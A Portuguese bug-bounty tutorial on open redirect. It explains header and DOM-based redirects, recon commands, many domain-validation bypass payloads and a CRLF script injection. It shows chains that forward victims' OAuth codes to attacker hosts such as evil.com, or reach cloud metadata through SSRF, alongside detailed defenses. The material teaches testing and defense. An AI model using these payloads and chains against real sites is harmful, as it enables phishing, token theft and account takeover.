---
title: "Open Redirect: o trampolim subestimado"
description: "Por que um redirect 'bobo' costuma valer pouco sozinho — mas vira crítico quando você o usa de trampolim pra roubar token OAuth, fazer SSRF ou montar phishing perfeito."
author: matheus
date: 2026-06-03 23:46:00 -0300
categories: [Bug Bounty, Vulnerabilidades]
tags: ["open redirect", "unvalidated redirect", "OAuth", "redirect_uri", "phishing", "SSRF", "CRLF", "chaining", "OWASP", "bug bounty", "web security", "Burp Suite"]
pin: false
comments: true
---

## "Achei um redirect, mas o triador fechou como informativo"

Acontece direto: o caçador encontra que `https://alvo.com/go?url=https://google.com` joga o navegador pro Google, reporta como **Open Redirect**, e a resposta vem fria — *"baixo impacto, não aceito"* ou um bounty simbólico. Aí o iniciante conclui que open redirect "não vale a pena" e para de testar.

Erro clássico. O open redirect é o **trampolim** mais subestimado do bug bounty. **Sozinho**, ele costuma valer pouco mesmo (faixa de R$0 num VDP — *Vulnerability Disclosure Program*, programa que aceita reports mas paga só em reconhecimento, sem dinheiro — a uns R$500 quando muito). Mas é a peça que **transforma um bug médio em crítico** quando entra numa **chain**: roubar o `code` de um fluxo OAuth, mascarar um SSRF, ou montar um phishing tão convincente que o link **realmente começa em `alvo.com`** e tem o cadeado de TLS do alvo. Neste post a gente vai do "o que é" até o uso ofensivo em chaining, com detecção, todos os bypasses de validação de domínio e a defesa que mata a classe.

> 💡 Aparecem aqui dois termos que valem fixar: **OAuth** é o protocolo de "Login com Google/GitHub" — um provedor confiável autentica você e devolve um `code`/token pro app. **SSRF** (*Server-Side Request Forgery*) é quando você força o **servidor** do alvo a fazer requisições por você (ex.: pra um recurso interno). Ambos têm post próprio na série.

> Open redirect é o **CWE-601** (CWE = catálogo público de tipos de fraqueza de software, mantido pela MITRE) e cai no guarda-chuva do OWASP como [Unvalidated Redirects and Forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html). Não tem uma posição própria no Top 10, mas aparece como **gadget** — peça reaproveitável que, combinada com outras, vira um ataque maior — de A01 (Broken Access Control) e como vetor de phishing/token theft.

## O que é Open Redirect

**Open redirect** (ou *unvalidated redirect*) é quando a aplicação **manda o navegador pra uma URL que veio do usuário**, sem validar pra onde. Você controla o destino do redirecionamento; o app obedece cegamente.

> **Analogia:** imagine a recepcionista de um prédio respeitável. Alguém liga e diz *"transfere essa ligação pro ramal 4823"*. Se ela transfere sem conferir se 4823 existe **dentro do prédio** — e na verdade joga a ligação pra um número de fora —, qualquer um pode usar a recepcionista de fachada confiável pra levar a vítima até um golpista. A vítima confia porque a ligação **começou** no prédio sério. O navegador é a vítima; a recepcionista é o servidor; o "ramal de fora" é o `evil.com`.

A definição da PortSwigger é direta: *"open redirection vulnerabilities arise when an application incorporates user-controllable data into the target of a redirection in an unsafe way"* ([PortSwigger KB](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)). A palavra-chave é **unsafe** — não é o redirect que é o problema, é a **falta de validação** do destino.

Existem dois sabores:
- **Redirect baseado em header** — o servidor responde `3xx` com um `Location:` controlado por você. É o mais comum.
- **Redirect client-side (DOM-based)** — o JavaScript da página lê um parâmetro e faz `window.location = ...` / `location.href = ...`. Aqui não tem `3xx`; quem redireciona é o browser executando o JS. (Detecção é diferente — falamos disso no recon.)

## Por que isso importa (e quanto paga)

O impacto **isolado** é, sim, baixo — e é importante você entender o **porquê** pra não brigar com o triador à toa. Um redirect puro não rouba dado, não executa código, não muda estado: ele só **leva você pra outro lugar**. O risco real é **engenharia social** — o link parece do alvo, mas termina no atacante.

Mas o valor explode quando o redirect vira **trampolim** numa chain. Aí o impacto não é "do redirect" — é do que ele **destrava**:

| Cenário | Impacto isolado | Em chain | Por quê |
|---|---|---|---|
| Phishing | Baixo | Médio/Alto | Link legítimo (`alvo.com` + TLS do alvo) que cai numa página de login clonada |
| **Roubo de `code`/token OAuth** | — | **Crítico** | O `redirect_uri` aponta pro alvo, mas um open redirect **no próprio alvo** repassa o `code` pro atacante → **ATO** |
| Mascarar **SSRF** | — | Alto/Crítico | A allowlist do SSRF só deixa passar `alvo.com`; o redirect interno leva ao recurso interno |
| Bypass de allowlist de saída | — | Médio | Validações que confiam que "começa com alvo.com está seguro" |
| Furtar `Authorization`/cookies via repasse | — | Alto | Quando o redirect carrega tokens na URL pra fora |

Faixa realista: **open redirect puro** costuma pagar de **nada (VDP/informativo)** a **~R$500**. **A mesma falha dentro de uma chain de OAuth** (roubo de token → account takeover) salta pra **Crítico** e paga de **milhares a dezenas de milhares**. **O dinheiro está na chain, não no redirect.**

### Como isso pontua (CVSS v3.1 e v4.0)

A nota técnica conta uma história parecida: **baixa/média sozinho, crítica em chain**. Repare que "vale pouco" (mercado) e "score baixo" (CVSS) não são a mesma coisa — o CVSS de um open redirect isolado costuma cair em **Médio**, não em "Baixo", porque o ataque **muda de escopo** (sai do alvo e atinge o usuário). Por isso é útil levar os dois números no report:

| Cenário | CVSS v3.1 | CVSS v4.0 | Leitura |
|---|---|---|---|
| **Open redirect isolado** | **6.1 — Médio**<br>`AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` | **~5.3 — Médio**<br>`AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:L/SA:N` | Exige **interação** da vítima (clicar); impacto é integridade/confiança, não dado direto. O `S:C` (escopo alterado) do v3.1 é o que segura em Médio. |
| **Chain: open redirect → roubo de `code`/token OAuth → ATO** | **8.0–9.3 — Alto/Crítico**<br>ex.: `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` (8.2) | **8.3–9.3 — Alto/Crítico**<br>ex.: `…/VC:H/VI:H/VA:N/SC:H/SI:H/…` | O impacto **não é do redirect** — é da conta tomada. Aqui você pontua o **resultado da chain** (ATO), não o gadget. |

> 💡 **Por que dois scores?** O **v3.1** ainda é o que a maioria dos programas usa; o **v4.0** ([FIRST, 2023](https://www.first.org/cvss/v4.0/specification-document)) trocou o `S` (Scope) por métricas separadas de impacto **no sistema** (`VC/VI/VA`) e **subsequente** (`SC/SI/SA`) — o que **descreve melhor um trampolim**, em que o dano acontece num *outro* sistema (a conta da vítima, um serviço interno). Para open redirect, a [referência da PortSwigger](https://portswigger.net/kb/issues/00500100_open-redirection-reflected) classifica a severidade do issue isolado como **Low/Information**, justamente porque o impacto direto depende de engenharia social — outra razão pra **pontuar a chain**, não o gadget.

> ⚠️ **Cheque o escopo.** Muitos programas marcam open redirect **isolado** como *out of scope* ou *informational*. Não desista: documente a **chain** ou o **impacto demonstrável** (token theft, phishing de credencial). É a chain que paga. Calibre o número com cuidado — detalhe no post [Severidade & Impacto](/posts/severidade-impacto-triagem/).

## Como funciona por trás

A raiz é sempre a mesma: **o destino do redirect vem do cliente e não é validado contra uma allowlist**. Veja o fluxo header-based vulnerável:

```http
GET /login?next=https://evil.com HTTP/2
Host: alvo.com
```

```http
HTTP/2 302 Found
Location: https://evil.com          # <- o servidor refletiu o "next" cru no Location
```

O navegador recebe o `302`, lê o `Location`, e segue obedientemente pro `evil.com`. O usuário só vê que **começou** em `alvo.com`.

Do lado do código, o pecado é refletir o input direto no redirect:

```php
// Backend VULNERÁVEL — confia no parâmetro e redireciona pra qualquer lugar
$dest = $_GET['next'];
header("Location: " . $dest);   // <- nenhuma validação de domínio
exit;
```

```javascript
// Node/Express VULNERÁVEL
app.get('/login', (req, res) => {
  res.redirect(req.query.next);   // <- mesmo erro: destino arbitrário
});
```

```javascript
// DOM-based VULNERÁVEL (client-side) — sem 3xx nenhum, quem redireciona é o browser
const params = new URLSearchParams(location.search);
window.location = params.get('returnUrl');   // <- input cru vira navegação
```

Repare: na versão DOM-based não existe `Location` na resposta do servidor. Quem executa o redirect é o JS no browser. Por isso ferramentas que só olham respostas HTTP **não pegam** esse caso — você precisa olhar o JS.

## Onde achar — os parâmetros suspeitos

Open redirect mora em parâmetros que carregam um **destino/URL de retorno**. Decore esta família — é onde você vai bater os olhos primeiro:

| Nome do parâmetro | Onde aparece tipicamente |
|---|---|
| `url`, `redirect`, `redirect_url`, `redir`, `rurl` | redirecionadores genéricos, encurtadores, trackers |
| `next`, `return`, `returnTo`, `return_url`, `return_path` | pós-login ("volte pra onde eu estava") |
| `dest`, `destination`, `target`, `go`, `to`, `out`, `view` | links de saída, "ir para" |
| `continue`, `callback`, `forward` | fluxos de continuação |
| `redirect_uri` | **OAuth/OIDC** (o mais valioso — destrava token theft) |
| `image_url`, `checkout_url`, `link`, `u` | trackers, e-commerce, e-mails de marketing |

> 💡 **Mapa mental:** todo lugar onde o app precisa **"te levar de volta pra onde você estava"** é candidato — pós-login, pós-logout, pós-checkout, pós-OAuth. Esse "de volta" quase sempre é um parâmetro, e parâmetro que aceita URL é onde o open redirect se esconde.

## Recon — como encontrar

A ideia é coletar **muitas URLs** do alvo e filtrar as que carregam parâmetros de redirect. As ferramentas de coleta de URL (`gau`, `katana`, `waybackurls`) já foram apresentadas no post [Recon & Discovery](/posts/recon-discovery/) — recapitulando rápido: `gau` puxa URLs do Wayback/AlienVault/etc., e `gf` é um wrapper de `grep` com padrões prontos por classe de bug.

```bash
# 1) Junta URLs históricas do alvo e filtra parâmetros de redirect
#    'gau' = get all urls (coleta passiva); 'gf redirect' usa o pattern pronto da classe
gau alvo.com | gf redirect | sort -u
```

```bash
# 2) Sem o gf? Filtra na unha os nomes de parâmetro suspeitos
gau alvo.com \
  | grep -Ei '[?&](url|next|redirect|redir|return|returnTo|dest|destination|continue|callback|redirect_uri|rurl|target|go|u)=' \
  | sort -u
```

```bash
# 3) DOM-based: baixe os arquivos .js e procure sinks de navegação client-side
echo alvo.com | katana -jc -silent \
  | grep -Ei '\.js($|\?)' \
  | while read u; do
      curl -s "$u" | grep -Eni 'location\.(href|replace|assign)|window\.location|document\.location'
    done
# leia o trecho: de onde vem o valor? Se vem de location.search/hash sem validar -> DOM open redirect
```

**Como confirmar um candidato no Burp:** mande a request no **Repeater**, troque o parâmetro pra um domínio que você controla (use `example.com`, que é reservado pra exemplos pela IANA, ou um Burp Collaborator) e veja a resposta:

```http
GET /go?url=https://example.com HTTP/2
Host: alvo.com
```

Se voltar `Location: https://example.com` (header-based) **ou** o navegador sair pro `example.com` ao abrir no browser (DOM-based) → candidato confirmado. **Importante:** desligue o "Follow redirects" do Repeater pra **ver** o `Location` em vez de já seguir.

## Exploração e bypasses de validação de domínio

A maioria dos alvos **tenta** validar o destino. O jogo do caçador é descobrir **como** eles validam e quebrar essa lógica. Vamos do mais simples ao mais sutil — entendendo **por que** cada um funciona, que é o que te deixa replicar em qualquer alvo.

### Nível 0 — Sem validação nenhuma

O destino é refletido cru. Funciona com qualquer URL absoluta:

```
https://alvo.com/go?url=https://evil.com
```

### Nível 1 — Bypass de URL scheme-relative (`//evil.com`)

Esse é o **rei dos bypasses** e o que aparece na maioria dos casos reais. Validações ingênuas checam *"a URL começa com `http://` ou `https://` de domínio externo?"* — e bloqueiam isso. Mas elas esquecem da **URL scheme-relative** (também chamada *network-path reference*, definida na [RFC 3986 §4.2](https://datatracker.ietf.org/doc/html/rfc3986#section-4.2)):

```
https://alvo.com/go?url=//evil.com        # <- duas barras, SEM esquema
```

**Por que funciona:** o navegador interpreta `//evil.com` como *"use o mesmo esquema da página atual (https) e vá pro host `evil.com`"*. Ou seja, vira `https://evil.com`. Mas pro filtro do servidor, a string **não contém** `http://` nem `https://`, então passa. Esse foi exatamente o padrão de um caso real anonimizado (um endpoint LTI que aceitava `redirect_uri=//evil.com` e jogava o usuário pra fora).

Variantes pra quando filtram `//`:

```
https://alvo.com/go?url=/\evil.com         # barra + backslash
https://alvo.com/go?url=\/\/evil.com       # backslashes
https://alvo.com/go?url=/%2f/evil.com      # barra encodada no meio
https://alvo.com/go?url=%2f%2fevil.com     # // totalmente encodado
```

**Por que funcionam:** navegadores **normalizam** `\` pra `/` (e decodificam `%2f`), mas muitos parsers de backend tratam `\` como caractere de path comum — então o servidor "acha" que é um caminho interno e libera, enquanto o browser entende como host externo. É uma **discrepância de parsing** entre quem valida (servidor) e quem executa (browser).

### Nível 2 — Bypass de esquema "colado" (`https:evil.com`)

Alguns filtros exigem que a URL **comece com `/`** (achando que assim fica relativa ao próprio host). Contorne com:

```
https://alvo.com/go?url=https:evil.com     # esquema sem as duas barras
https://alvo.com/go?url=https:/evil.com    # esquema com UMA barra
```

**Por que funciona:** `https:evil.com` é interpretado por muitos browsers como `https://evil.com` (eles toleram a ausência das `//`). O filtro não vê o `//` clássico e deixa passar.

### Nível 3 — Bypass via `@` no userinfo (`https://alvo.com@evil.com`)

Esse engana **humano e máquina**. A sintaxe de URL permite `usuario:senha@host` (a parte *userinfo*, [RFC 3986 §3.2.1](https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.1)). Então:

```
https://alvo.com/go?url=https://alvo.com@evil.com   # <- "alvo.com" é só o usuário!
```

**Por que funciona:** pro browser, tudo **antes do `@`** é credencial (userinfo) e o **host real** é o que vem **depois** — ou seja, `evil.com`. Mas um filtro que faz *"a URL contém `alvo.com`?"* ou *"começa com `https://alvo.com`?"* vê o `alvo.com` no começo e aprova. É o bypass perfeito contra validação por `startsWith`/`contains`.

### Nível 4 — Confusão de subdomínio e sufixo

Aqui o atacante registra um domínio que **engana** a checagem de string:

| Payload | Checagem que ele engana | Por que passa |
|---|---|---|
| `https://evil.com/alvo.com` | `contains("alvo.com")` | `alvo.com` aparece no **path**, mas o host é `evil.com` |
| `https://alvo.com.evil.com` | `startsWith("alvo.com")` | o host **começa** com `alvo.com.` mas o domínio registrável é `evil.com` |
| `https://evilalvo.com` | `contains("alvo.com")` parcial | substring casa, mas é outro domínio |
| `https://alvo.com.evil.com` | `endsWith` malfeito | precisa terminar com `.alvo.com`, não conter |

**Por que funcionam:** todas exploram validação por **substring** em vez de **parsing real do host**. A lição: nunca valide host com `contains`/`startsWith`/`endsWith` em string — só com um **parser de URL** que extraia o host e compare exato.

### Nível 5 — Encoding e double-encoding

Quando o filtro roda **antes** da decodificação, ou decodifica uma vez a menos que o browser:

```
https://alvo.com/go?url=https%3A%2F%2Fevil.com        # URL-encoded simples
https://alvo.com/go?url=https%253A%252F%252Fevil.com  # double-encoded
https://alvo.com/go?url=http://evil.com%2523@alvo.com # mistura encoding + @
```

**Por que funciona:** se a aplicação valida a string **codificada** (e portanto não vê `evil.com`) mas depois **decodifica** antes de redirecionar, o destino real escapa da validação. Double-encoding ataca camadas que decodificam duas vezes.

### Nível 6 — CRLF no parâmetro de redirect (escala pra XSS/header injection)

Quando o valor do parâmetro vai **cru pro header `Location`** e o servidor **não filtra `\r\n`** (CRLF — *carriage return + line feed*, os bytes `%0d%0a` que separam um header do outro no HTTP), o "open redirect" deixa de ser só redirect: você consegue **injetar headers** e até **HTML/JS** na resposta. É a ponte entre open redirect e [CRLF Injection](/posts/crlf-request-smuggling/).

```
https://alvo.com/logout?redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>
```

**Por que funciona:** o `%0d%0a%0d%0a` fecha os headers e abre o **corpo** da resposta; se o `Content-Type` for `text/html`, o navegador renderiza o que vier depois — virando **XSS refletido**. Esse foi exatamente o padrão de um caso real anonimizado: um gateway corporativo refletia o parâmetro `post_logout_redirect_uri` do endpoint de logout sem sanitizar CRLF, e um payload com `%0D%0A%0D%0A<body onload=...>` executava JS no domínio do alvo (classe pública [CVE-2023-24488](https://cwe.mitre.org/data/definitions/601.html)). Aqui a severidade **sobe sozinha**, sem precisar de outra falha: XSS no domínio do alvo já é Alto.

> 💡 Antes de cravar "só open redirect", sempre teste **um `%0d%0a` no parâmetro**. Se a quebra de linha passa pro `Location`, você pode ter CRLF/XSS no colo — um achado bem mais valioso. A mecânica completa está em [CRLF Injection e HTTP Request Smuggling](/posts/crlf-request-smuggling/).

> 💡 **Dica de ouro do bypass:** o open redirect quase sempre é uma **discrepância de parsing** — o validador e o executor (browser) entendem a mesma string de formas diferentes. Sua arma é uma boa **wordlist** rodada no parâmetro. A página [Open Redirect do PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md) reúne os payloads de bypass prontos (e linka a wordlist [Open-Redirect-Payloads do Cujanović](https://github.com/cujanovic/Open-Redirect-Payloads)) — jogue no **Burp Intruder** (posição no parâmetro) e veja qual variação escapa.

## Onde o trampolim vira crítico: chaining

Aqui é o coração do post. **Sozinho** o redirect é fraco; em chain ele destrava o ouro. Open redirect é um dos **gadgets** mais reutilizados em chains — se a ideia de "somar bugs pequenos num crítico" ainda é nova pra você, o post [Chaining de Vulnerabilidades](/posts/chaining-vulnerabilidades/) trata disso a fundo; aqui mostramos os três encaixes mais rentáveis.

### Chain 1 — Roubo de `code` OAuth → Account Takeover

Esse é o uso de maior impacto. Recapitulando o fluxo OAuth *authorization code* (que detalhamos no post [Account Takeover](/posts/account-takeover/)): o app redireciona você pro provedor (Google/GitHub) com `client_id`, `redirect_uri`, `response_type=code`, `scope` e `state`. O provedor autentica e devolve um **`code`** pro `redirect_uri`. Quem tiver o `code` troca por um token e **loga como você**.

Os provedores sérios validam o `redirect_uri` contra uma allowlist exata — você **não consegue** apontar direto pra `evil.com`. **Mas** a PortSwigger aponta o caminho: se você achar um **open redirect dentro do próprio domínio whitelisted**, o `redirect_uri` continua sendo `alvo.com` (válido!), o provedor entrega o `code` pra `alvo.com`, e o **open redirect repassa esse `code` pra você**. Como diz a [PortSwigger sobre OAuth](https://portswigger.net/web-security/oauth), um open redirect no cliente legítimo vira *"a proxy to forward victims, along with their code or token, to an attacker-controlled domain"*.

> 💡 **Detalhe que destrava o lab clássico:** mesmo quando a allowlist do provedor é estrita, ela muitas vezes só checa se o `redirect_uri` **começa com** o valor cadastrado — e deixa você **anexar** caracteres no fim, incluindo `/../`. No [lab oficial da PortSwigger](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect), o truque é `redirect_uri=https://alvo.com/oauth-callback/../post/next?path=//evil.com` — o `/../` "sobe" do callback e cai no open redirect do blog. É o **Nível 4** (validação por `startsWith`) reaparecendo, agora dentro do OAuth.

Na prática, o `redirect_uri` aponta pra um endpoint de redirect interno do alvo:

```http
GET /oauth/authorize?client_id=app123
 &response_type=code
 &redirect_uri=https://alvo.com/login/callback?next=//evil.com   # <- callback válido, mas com open redirect embutido
 &scope=openid+email
 &state=xyz HTTP/2
Host: accounts.provedor.com
```

Fluxo do ataque:
1. A vítima clica no link (parece 100% legítimo — começa no provedor real e usa o `alvo.com` real).
2. O provedor autentica e redireciona pra `https://alvo.com/login/callback?next=//evil.com&code=AUTH_CODE`.
3. O endpoint `/login/callback` do alvo, vulnerável, segue o `next` e redireciona pra `//evil.com` **carregando o `code` junto** (no query ou via `Referer`).
4. O atacante captura o `code` em `evil.com` e troca por um token → **ATO**.

Variante ainda mais direta com o **implicit grant** (`response_type=token`): aí o **access token** vem na **fragment** (`#access_token=...`) da URL de callback. Como a PortSwigger nota, *"the access token is sent from the OAuth service to the client application via the user's browser as a URL fragment"* — e fragment é lido por JS no browser, então um open redirect client-side no callback vaza o token direto. O detalhe que faz a chain fechar: **o navegador reanexa a fragment ao seguir um redirect**, então quando o open redirect leva pra `evil.com`, o `#access_token=...` vai junto; em `evil.com` um `document.location.hash` captura o token e reenvia pro atacante (é assim que o lab da PortSwigger exfiltra).

### Chain 2 — Mascarar/destravar SSRF

Quando um endpoint de [SSRF](/posts/ssrf/) tem allowlist (*"só aceito URLs de `alvo.com`"*), você dá uma URL de `alvo.com` que **redireciona** pro alvo interno:

```http
POST /api/fetch-preview HTTP/2
Host: alvo.com
Content-Type: application/json

{"url":"https://alvo.com/go?url=http://169.254.169.254/latest/meta-data/"}
# <- passa a allowlist (é alvo.com), mas o redirect leva o fetcher pro metadata interno
```

**Por que funciona:** o validador de SSRF aprova `alvo.com`; o cliente HTTP do servidor então **segue o redirect** (se `follow redirects` estiver ligado) e acaba batendo no recurso interno (ex.: o endpoint de metadados `169.254.169.254` da nuvem). Esse é um dos bypasses clássicos de allowlist de SSRF — a mecânica completa (e por que tantos fetchers seguem redirect cegamente) está no post [SSRF](/posts/ssrf/). Aqui o ponto é só: open redirect **fura allowlist de saída**.

### Chain 3 — Phishing de alta credibilidade

O mais "simples", mas eficaz. O link de phishing **começa em `alvo.com`**, com o cadeado de TLS do alvo, e só depois cai numa página de login clonada. A vítima vê `https://alvo.com/...` no e-mail/SMS e confia. É o impacto que a PortSwigger e a OWASP citam como o **principal perigo** do open redirect isolado.

## Caso real-fictício: open redirect → token OAuth → ATO

> Cenário **fictício, baseado em padrões reais** (anonimizado). Inspirado em padrões públicos como o redirect aberto via `redirect_uri=//...` em componentes de SSO/LTI.

Você testa `app.exemplo.com`, que oferece "Login com Provedor". Durante o login pós-OAuth, o Burp registra um callback interno:

**Passo 1 — Achar o redirect interno.** No histórico do Burp, o endpoint de callback tem um parâmetro `continue`:

```http
GET /sso/callback?continue=/dashboard HTTP/2
Host: app.exemplo.com
```

No Repeater, você testa o bypass scheme-relative:

```http
GET /sso/callback?continue=//example.com HTTP/2
Host: app.exemplo.com
```

```http
HTTP/2 302 Found
Location: //example.com           # <- redirect aberto confirmado (vira https://example.com no browser)
```

Open redirect confirmado no `continue`. **Isolado**, seria baixo. Mas o `continue` está **no endpoint de callback do OAuth**.

**Passo 2 — Confirmar que o `redirect_uri` aceita esse callback.** O início do fluxo OAuth aponta o `redirect_uri` pro próprio callback do app (válido na allowlist do provedor):

```http
GET /authorize?client_id=app_exemplo
 &response_type=code
 &redirect_uri=https://app.exemplo.com/sso/callback?continue=//atacante.com
 &state=abc123 HTTP/2
Host: accounts.provedor.com
```

O provedor valida o `redirect_uri` — e ele **é** `app.exemplo.com`, então passa.

**Passo 3 — A chain.** Você manda esse link pra vítima (parece legítimo). Ela autentica no provedor real; o provedor redireciona pra `https://app.exemplo.com/sso/callback?continue=//atacante.com&code=AUTH_CODE`; o callback vulnerável segue o `continue` e joga o navegador pra `//atacante.com` **com o `code` anexado/no `Referer`**. Em `atacante.com`, você captura o `code` e troca por token.

```http
GET /?code=AUTH_CODE_DA_VITIMA HTTP/2     # <- chega no servidor do atacante
Host: atacante.com
```

**O que a tela do Burp mostraria:** painel Request/Response com o `302 Location: //example.com` destacado em vermelho no PoC do redirect; e, na demonstração da chain, a request final chegando no Collaborator/servidor do atacante carregando o parâmetro `code` da vítima.

**Passo 4 — Report.** Título: `[Open Redirect → OAuth Code Theft] ATO via continue= no /sso/callback`. Severidade **Crítica** (account takeover de qualquer usuário que clicar). No resumo, deixe explícito que o open redirect é o **gadget** e o impacto é **roubo de token + ATO** — é isso que tira o report do balde "informativo". (Veja [Como escrever um report que paga](/posts/como-escrever-report-que-paga/) e a calibração de severidade em [Severidade & Impacto](/posts/severidade-impacto-triagem/).)

## Defesa em camadas

A regra-mãe: **nunca reflita input cru no destino do redirect.** A OWASP é categórica — *"if used, do not allow the URL as user input for the destination"*. Em ordem de preferência:

**1. O ideal — não aceite URL nenhuma. Use um índice/ID mapeado no servidor:**

```php
// CORRETO — o cliente manda uma CHAVE, não uma URL. Zero superfície de bypass.
$destinos = [
    'dashboard' => '/painel',
    'perfil'    => '/conta/perfil',
    'faturas'   => '/financeiro/faturas',
];
$key = $_GET['next'] ?? 'dashboard';
$dest = $destinos[$key] ?? '/painel';   // fallback seguro se a chave não existe
header("Location: " . $dest);
exit;
```

Essa é a recomendação tanto da OWASP (*"server-side mapping"*) quanto da PortSwigger (*"pass an index into this list"*). Sem URL crua, não tem o que bypassar.

**2. Se PRECISA aceitar destino — force caminho relativo (mesma origem):**

```javascript
// Node — só permite redirect DENTRO do próprio site
function safeRedirect(res, input) {
  // Rejeita qualquer coisa que possa virar host externo:
  // - tem que começar com UMA barra
  // - NÃO pode começar com // ou /\ (scheme-relative)
  if (typeof input !== 'string' || !/^\/[^/\\]/.test(input)) {
    return res.redirect('/');             // fallback seguro
  }
  return res.redirect(input);             // ex.: "/dashboard" -> sempre same-origin
}
```

O regex `^\/[^/\\]` exige: começa com `/` **e** o segundo caractere **não** é `/` nem `\`. Isso mata `//evil.com`, `/\evil.com` e `\/...` de uma vez.

**3. Se PRECISA de destino absoluto/externo — allowlist com parser de URL real (nunca string):**

```python
from urllib.parse import urlparse

ALLOWED_HOSTS = {"app.exemplo.com", "conta.exemplo.com"}

def is_safe_redirect(target: str) -> bool:
    p = urlparse(target)
    # 1) Exige esquema explícito e host -> evita //evil.com e https:evil.com
    if p.scheme not in ("http", "https") or not p.netloc:
        return False
    # 2) Compara o HOST EXATO extraído pelo parser (urlparse já ignora userinfo)
    #    p.hostname descarta "user@" -> mata o bypass https://alvo.com@evil.com
    return p.hostname in ALLOWED_HOSTS
```

```java
// Java — Spring: hardcode quando possível, ou valide host parseado
URI uri = URI.create(target);
if (!ALLOWED_HOSTS.contains(uri.getHost())) {     // getHost() ignora userinfo
    return "redirect:/";                          // fallback seguro
}
return "redirect:" + uri;
```

O segredo é usar **`hostname`/`getHost()`** do parser — ele extrai o host real (descartando o `user@`) e você compara com **igualdade exata**, nunca `startsWith`/`contains`/`endsWith`.

**4. Defesa de profundidade:**
- **Página de confirmação:** pra redirects de saída inevitáveis (trackers), mostre *"você está saindo de alvo.com para X. Continuar?"* — a OWASP recomenda isso explicitamente.
- **No OAuth, `redirect_uri` em allowlist EXATA** (match completo da URL, **não** "começa com") — assim, nem que exista um open redirect no app o `code` consegue ser repassado pra fora pelo `redirect_uri`. (Detalhe no post [Account Takeover](/posts/account-takeover/).)
- **`code`/token de uso único e validade curtíssima**, e **fragment não logada** — reduz a janela de roubo via Referer.
- **`Referrer-Policy: no-referrer`** em páginas que carregam segredos na URL — corta o vazamento de `code`/token pro destino do redirect.

> ❌ **O que NÃO basta:**
> - Validar com `startsWith("https://alvo.com")` → quebra com `https://alvo.com@evil.com` e `https://alvo.com.evil.com`.
> - Validar com `contains("alvo.com")` → quebra com `https://evil.com/alvo.com`.
> - Bloquear só `http://`/`https://` → quebra com `//evil.com` e `https:evil.com`.
> - Validar a string **antes** de decodificar → quebra com encoding/double-encoding.
> - Confiar que "começa com `/` está seguro" → quebra com `//evil.com` e `/\evil.com`.

## Ferramentas + labs legais

- **Burp Suite** — Repeater (confirmar, com *Follow redirects* **desligado** pra ver o `Location`), Intruder (rodar wordlist de bypass no parâmetro), Collaborator (capturar o `code`/callback fora).
- **gau / waybackurls / katana** — coletar URLs e achar parâmetros de redirect (apresentados no post [Recon & Discovery](/posts/recon-discovery/)).
- **gf** (com o pattern `redirect`) — filtrar candidatos automaticamente do output do `gau`.
- **OpenRedireX** — fuzzer dedicado de open redirect (recebe lista de URLs + payloads e testa os bypasses).
- **Labs pra praticar (autorizados):** [PortSwigger — OAuth 2.0 vulnerabilities](https://portswigger.net/web-security/oauth) (o lab de roubo de `code` via open redirect é ouro), [PortSwigger — DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection), TryHackMe, HackTheBox, HackingClub.

## Checklist do caçador

- [ ] Coletei URLs do alvo (`gau`/`katana`) e filtrei parâmetros de redirect (`gf redirect` ou `grep`).
- [ ] Testei a família de parâmetros: `url`, `next`, `return(To)`, `dest`, `continue`, `callback`, `redirect_uri`, `rurl`, `go`, `u`.
- [ ] Confirmei no Repeater com **Follow redirects desligado** (header-based) e no browser (DOM-based).
- [ ] Rodei os bypasses: `//evil.com`, `/\evil.com`, `https:evil.com`, `https://alvo.com@evil.com`, `alvo.com.evil.com`, encoding/double-encoding.
- [ ] Testei **CRLF** no parâmetro (`%0d%0a`) — se a quebra de linha vaza pro `Location`, pode virar header injection/XSS.
- [ ] Verifiquei se o parâmetro vive em **endpoint de OAuth/callback** (`redirect_uri`, `/callback`, `/sso`) → potencial **token theft**. Testei também anexar `/../` ao `redirect_uri` whitelisted.
- [ ] Tentei usar o redirect pra **furar allowlist de SSRF** ou de saída.
- [ ] Documentei a **chain/impacto** (não só "redireciona pro Google") — é o que tira do balde informativo.
- [ ] Conferi se open redirect **isolado** está no escopo do programa.

## Pegadinhas / o que NÃO funciona

- **Reportar redirect puro como Alto** sem chain → triador fecha como informativo. Mostre o **impacto** (token, phishing de credencial).
- **Esquecer DOM-based** → se a resposta não tem `Location`, não conclua "não tem bug": olhe o JS (`location.href = ...`).
- **Confundir same-site redirect com open redirect** → redirecionar pra outro path **do mesmo host** (`/dashboard`) **não** é vulnerabilidade; só vira bug se sai pro **host externo**.
- **Testar com `evil.com` que não existe** → use `example.com` (reservado pela IANA) ou seu Collaborator pra ter uma prova limpa de que saiu do alvo.
- **Achar que `state` salva tudo no OAuth** → `state` protege contra CSRF de vínculo, **não** contra roubo de `code` via open redirect. São defesas diferentes.

## O que você precisa lembrar

- **Open redirect = destino do redirect vem do usuário e não é validado.** Pode ser header-based (`Location`) ou DOM-based (JS).
- **Isolado vale pouco; em chain vale muito.** O ouro é OAuth code/token theft → ATO, SSRF e phishing crível.
- **Bypass é discrepância de parsing:** `//`, `\`, `@` no userinfo, sufixo de domínio, encoding. Valide host com **parser**, nunca com substring.
- **Defesa que mata a classe:** mapa de IDs no servidor, ou caminho relativo, ou allowlist por **host exato parseado**.

> 💡 **Dica de ouro:** quando achar um open redirect, não pergunte *"quanto isso vale?"* — pergunte *"onde isso me leva?"*. Se ele estiver perto de um fluxo OAuth, de um fetcher server-side ou de um e-mail transacional, você não tem um redirect: você tem um **trampolim pra algo crítico**.

## Nota ética

